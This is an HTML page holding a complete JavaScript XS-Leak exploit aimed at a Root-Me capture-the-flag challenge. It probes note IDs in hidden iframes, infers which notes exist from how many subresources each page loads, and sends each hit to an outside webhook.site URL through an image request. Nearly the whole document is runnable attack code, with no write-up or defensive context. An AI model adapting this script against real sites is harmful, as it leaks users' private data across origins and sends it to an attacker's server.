<!DOCTYPE html>
<html>
<head>
    <title>Subresource XS-Leak Scanner</title>
</head>
<body>
    <h1>Scanning for notes...</h1>
    <div id="status"></div>
    <script>
        const TARGET_BASE = 'https://web-client-ch56.challenge01.root-me.org:58056/notes/';
        const WEBHOOK = 'https://webhook.site/04ff6bdb-7cda-4c12-b9a3-be41cf998864';
        const START_ID = 1378;
        const END_ID = 2000;
        const DELAY_MS = 500;                // delay between IDs
        const BASELINE_ID = -1;               // non-existent ID
        const IFRAME_TIMEOUT = 2000;          // max wait for iframe to load

        function updateStatus(msg) {
            const div = document.getElementById('status');
            div.innerHTML += msg + '<br>';
            console.log(msg);
        }

        // Count subresources loaded from the same origin as the target
        function countSubresources(origin, afterTimestamp) {
            const entries = performance.getEntriesByType('resource');
            let count = 0;
            for (const entry of entries) {
                if (entry.startTime > afterTimestamp && entry.name.startsWith(origin)) {
                    count++;
                }
            }
            return count;
        }

        // Measure subresource count for a given ID
        async function measureSubresources(id) {
            return new Promise((resolve) => {
                const url = TARGET_BASE + id;
                const origin = new URL(url).origin;
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.src = url;

                // Mark before load
                const beforeTime = performance.now();
                let resolved = false;

                const timeout = setTimeout(() => {
                    if (!resolved) {
                        resolved = true;
                        document.body.removeChild(iframe);
                        // Count subresources after timeout (maybe still loading)
                        const count = countSubresources(origin, beforeTime);
                        updateStatus(`ID ${id} (timeout): subresource count = ${count}`);
                        resolve(count);
                    }
                }, IFRAME_TIMEOUT);

                iframe.onload = () => {
                    clearTimeout(timeout);
                    if (resolved) return;
                    resolved = true;
                    // Wait a bit for any subresources to start loading
                    setTimeout(() => {
                        const count = countSubresources(origin, beforeTime);
                        updateStatus(`ID ${id}: subresource count = ${count}`);
                        document.body.removeChild(iframe);
                        resolve(count);
                    }, 200);
                };
                document.body.appendChild(iframe);
            });
        }

        // Measure baseline (non-existent ID)
        async function getBaseline() {
            updateStatus(`Measuring baseline using ID ${BASELINE_ID}...`);
            // Clear existing performance entries
            performance.clearResourceTimings();
            const baselineCount = await measureSubresources(BASELINE_ID);
            updateStatus(`Baseline subresource count = ${baselineCount}`);
            return baselineCount;
        }

        async function checkId(id, baselineCount) {
            performance.clearResourceTimings();
            const subCount = await measureSubresources(id);
            // If subresource count is higher than baseline, it's a positive
            return subCount > baselineCount;
        }

        function reportId(id) {
            const url = `${WEBHOOK}?id=${id}`;
            new Image().src = url;
            updateStatus(`✅ Found note ID: ${id} → reported`);
        }

        async function run() {
            const baseline = await getBaseline();
            updateStatus(`Starting scan from ${START_ID} to ${END_ID}...`);
            for (let id = START_ID; id <= END_ID; id++) {
                const exists = await checkId(id, baseline);
                if (exists) {
                    reportId(id);
                    break; // remove if you want to continue scanning
                }
                await new Promise(r => setTimeout(r, DELAY_MS));
            }
            updateStatus('Scan complete.');
        }

        run();
    </script>
</body>
</html>
